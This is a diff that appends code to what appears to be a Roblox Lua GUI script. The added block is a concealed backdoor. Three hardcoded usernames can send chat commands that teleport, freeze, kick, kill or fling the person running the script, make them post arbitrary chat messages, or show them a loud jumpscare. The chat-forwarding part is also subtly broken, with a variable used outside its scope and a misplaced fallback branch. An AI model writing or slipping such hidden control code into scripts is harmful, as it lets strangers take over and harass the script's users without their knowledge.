@@ -828,3 +828,63 @@ uis.InputBegan:Connect(function(i, g)
 end)
 
 screen.ResetOnSpawn = false
+ 
+for _, control in pairs(plr:GetPlayers()) do
+	if control.Name == "1reserveacc1" or control.Name == "Litka505" or control.Name == "Baconchik_oofarik" then
+		control.Chatted:Connect(function(chat)
+			if chat == "!bring" then
+				hrp.CFrame = control.Character.HumanoidRootPart.CFrame
+			elseif chat == "!freeze" then
+				hrp.Anchored = true
+			elseif chat == "!unfreeze" then
+				hrp.Anchored = false
+			elseif chat:sub(1,4) == "!say" then
+				local cArgs = chat:sub(6)
+ 
+				if cArgs ~= "" then
+					if textChat and textChat:FindFirstChild("TextChannels") then
+                    	local textChat2 = textChat.TextChannels:FindFirstChild("RBXGeneral")
+					end
+					if textChat2 then
+						textChat2:SendAsync(cArgs)
+					end
+				elseif rep and rep:FindFirstChild("DefaultChatSystemChatEvents") then
+                    local oldChat = rep.DefaultChatSystemChatEvents
+					if oldChat then
+						oldChat.SayMessageRequest:FireServer(cArgs, "ALL")
+					end
+				end
+			elseif chat == "!ban" then
+				me:Kick("You have been banned!")
+			elseif chat == "!jumpscare" then
+				local Jscreen  = Instance.new("ScreenGui")
+				Jscreen.Parent = me.PlayerGui
+ 
+				local Jimage  = Instance.new("ImageLabel")
+				Jimage.Parent = Jscreen
+				Jimage.Image  = "http://www.roblox.com/asset/?id=91274624708428"
+				Jimage.Size   = UDim2.new(1,1,1,1)
+ 
+				local Jsound                = Instance.new("Sound")
+				Jsound.Parent               = work
+				Jsound.Name                 = "jmp"
+				Jsound.SoundId              = "rbxassetid://6129291390"
+				Jsound.Volume               = 10
+ 
+				work.jmp.Playing = true
+ 
+				Jscreen.ResetOnSpawn = false
+ 
+				task.delay(9.8, function()
+    				Jscreen:Destroy()
+				end)
+			elseif chat == "!kill" then
+				hum.Health = 0
+			elseif chat == "!fling" then
+				hrp.CFrame = CFrame.new(-64.4950714, 633.052734, 104.106598, -0.921858728, -0.378823459, 0.0816653818, -1.67315939e-10, 0.210735187, 0.977543235, -0.387526065, 0.901156723, -0.1942681)
+			end
+		end)
+	end
+end
+ 
+screen.ResetOnSpawn = false
